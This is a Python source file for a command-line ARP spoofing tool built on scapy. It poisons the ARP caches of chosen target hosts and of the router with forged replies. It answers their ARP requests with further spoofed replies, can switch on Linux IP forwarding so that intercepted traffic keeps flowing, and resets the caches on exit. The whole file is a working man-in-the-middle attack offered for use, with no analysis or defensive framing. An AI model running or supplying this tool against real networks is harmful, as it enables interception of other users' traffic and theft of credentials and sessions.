import scapy.all as scapy
from time import sleep
import threading
from argparse import ArgumentParser

class Spoof:

    def __init__(self,targetips: list,routerip,mac=None,ip_forward=False):

        self.mymac = mac
        self.routerip = routerip
        self.routermac = self.getMac(self.routerip)
        self.targets = {}
        
        try:
            for ip in targetips:
                self.targets[ip] = self.getMac(ip)

        except IndexError:
            raise Exception("Couldn't get targets MAC address")

        if ip_forward:
            self.ipForward()

    def getMac(self,ip):

        arp_request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        full = broadcast / arp_request
        answer = scapy.srp(full, timeout = 6, verbose = False)[0]
        return answer[0][1].hwsrc


    def spoof(self,target_ip,target_mac,spoof_ip,attacker_mac=None):

        if attacker_mac is None:
            packet = scapy.ARP(op = 2,
                               pdst = target_ip,
                               hwdst = target_mac,
                               psrc = spoof_ip)
        else:
            packet = scapy.ARP(op = 2,
                               pdst = target_ip,
                               hwdst = target_mac,
                               psrc = spoof_ip,
                               hwsrc = attacker_mac)

        scapy.send(packet, verbose = False)


    def showOptions(self):
        if self.mymac == None:
            print("Your MAC: Default")
        else:
            print("Your MAC:", self.mymac)
        for host in self.targets:
            print("Target IP:", host)
            print("Target MAC:", self.targets.get(host))

        print("Router IP:", self.routerip)
        print("Router MAC:", self.routermac)

        
    def t(self,pkt):

        if scapy.ARP in pkt and pkt[scapy.ARP].op == 1:

            if pkt.psrc in self.targets and pkt.pdst == self.routerip:
                print(pkt.psrc, "is asking for", pkt.pdst, ", sending spoofed replies...")
                for x in range(5):
                    self.spoof(pkt.psrc,self.targets[pkt.psrc],self.routerip,self.mymac)
                    sleep(0.5)

            if pkt.psrc == self.routerip and pkt.pdst in self.targets:
                print(self.routerip, "is asking for", pkt.pdst, ", sending spoofed replies...")
                for x in range(5):
                    self.spoof(self.routerip,self.routermac,pkt.pdst,self.mymac)
                    sleep(0.5)

    def arpTrigger(self,pkt):

        threading.Thread(target=self.t, args=(pkt,)).start()

    def ipForward(self):

        #TODO: Implement cross-platform IP forwarding

        ip_forward_path = "/proc/sys/net/ipv4/ip_forward"
        f = open(ip_forward_path)
        
        if f.read() == "1\n":
            f.close()

        else:
            f.close()
            print("Enabling IP Forwarding...")
            f = open(ip_forward_path, "w")
            f.write("1\n")
            f.close()


    def start(self):

        for x in range(5):
            for host in self.targets:
                self.spoof(host,self.targets[host],self.routerip,self.mymac)
                self.spoof(self.routerip,self.routermac,host,self.mymac)

            sleep(0.5)


        f = "arp"
        for host in self.targets:
            f += " and host {}".format(host)


        scapy.sniff(prn=self.arpTrigger, filter=f, store=0)

        print("\nResetting ARP cache and exiting...")
        for host in self.targets:
            self.spoof(host,self.targets[host],self.routerip,self.routermac)
            self.spoof(self.routerip,self.routermac,host,self.targets[host])


        
def main():
    parser = ArgumentParser(description="Spoof ARP replies on your LAN")
    
    parser.add_argument("-t",
                        "--target",
                        help="Target IP, or comma-separated IPs, e.g. 192.168.1.7,192.168.1.8",
                        required=True)
    
    parser.add_argument("-r",
                        "--router",
                        help="IP Address of router (optional)",
                        default=scapy.conf.route.route("0.0.0.0")[2])
    
    parser.add_argument("-m",
                        "--mac",
                        help="Manually set your mac address (optional)",
                        default=None)
    parser.add_argument("-fw",
                        "--forward",
                        help="Enable IP Forwarding (currently only supported on Linux based operating systems",
                        default=False,
                        action="store_true")
    
    cli_input = parser.parse_args()
    spoofer = Spoof(cli_input.target.split(","),cli_input.router,cli_input.mac,cli_input.forward)
    spoofer.showOptions()
    spoofer.start()

if __name__ == "__main__":
    main()
